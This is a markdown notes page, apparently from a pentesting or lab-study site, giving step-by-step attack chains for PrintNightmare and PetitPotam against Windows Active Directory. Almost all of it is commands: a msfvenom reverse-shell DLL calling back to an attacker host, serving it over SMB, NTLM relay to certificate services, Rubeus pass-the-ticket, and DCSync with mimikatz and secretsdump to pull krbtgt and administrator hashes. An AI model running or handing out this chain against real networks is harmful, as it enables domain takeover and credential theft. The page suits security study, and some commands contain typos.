---
layout: app
title: "PrintNigthmare"
tags: ["PrintNigthmare","cve-2021-34527", "Windows", "AD","Print Spool Service", "CVE-2021-1675","Local Privilege Scalation","DCSync"]

---

# PrintNigthMare

This is a vulnerability that allows the use of the Windows Spooler Service to run remote code

## Detect 
Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.

```python
impacket-rpcdump @<IP> | grep -E 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote                     
Protocol: [MS-RPRN]: Print System Remote Protocol

```
After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.


[https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/](https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/)

## CVE-2021-34527 (LPE)

[https://github.com/JohnHammond/CVE-2021-34527/tree/master](https://github.com/JohnHammond/CVE-2021-34527/tree/master)

## CVE-2021-1675 (RCE)

[https://github.com/cube0x0/CVE-2021-1675/tree/main](https://github.com/cube0x0/CVE-2021-1675/tree/main)

### Exploit

Create a dll with msfvenom
```bash
msfvenom -p /windows/x64/reverse_tcp LHOST=[host] LPORT=[port] -f dll > dll.dll
```
Share file using smbserver
```bash
smbserver.py -smb2support share dll.dll
```

Start msf with multi handler

Run the exploit
```
python CVE-2021-1675.py [domain]/[username]:password@IP '\\192.168.217.129\share\backupscript.dll'     
```

# PetitPotam (MS-EFSRPC)

[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)

## Exploit

Start ntlm relay
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://crtp.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

In other window run [PetitPotam.py](https://github.com/topotam/PetitPotam)
```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5 
```

With base64 certificate result:

### Requesting a TGT Using gettgtpkinit.py from PKINITtools

```bash
python3 gettgtpkinit.py crtp.LOCAL/C01\$ -pfx-base64 [base64value]
```

### Rubeus

Once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

```powershell
.\Rubeus.exe asktgt /user:DC01$ /certificate:[base64 certificate] /ptt
```

### Performing DCSync with Mimikatz

```powershell
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:crtp\krbtgt

```

### Setting the KRB5CCNAME Environment Variable

```bash
export KRB5CCNAME=dc01.ccache
```

### Using Domain Controller TGT to DCSync

```bash
secretsdump.py -just-dc-user crtp/administrator -k -no-pass "DC01$"@DC01.CRTP.LOCAL
```

**This tool will retrieve the username from the ccache file.**

> We can see this by typing klist (using the klist command requires installation of the krb5-user package on our attack host. This is installed on ATTACK01 in the lab already).

> apt install krb5-user

### Confirming Admin Access to the Domain Controller

```
NetExec smb [IP ADDRESS] -u administrator -H [HASH]
```

### Submitting a TGS Request for Ourselves Using getnthash.py

We can also take an alternate route once we have the TGT for our target. Using the tool getnthash.py from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

```bash
python /PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 crtp.LOCAL/DC01$
```

### Using Domain Controller NTLM Hash to DCSync
```bash
secretsdump.py -just-dc-user crtp/administrator "DC01$"@[IP Address] -hashes [HASH]
```
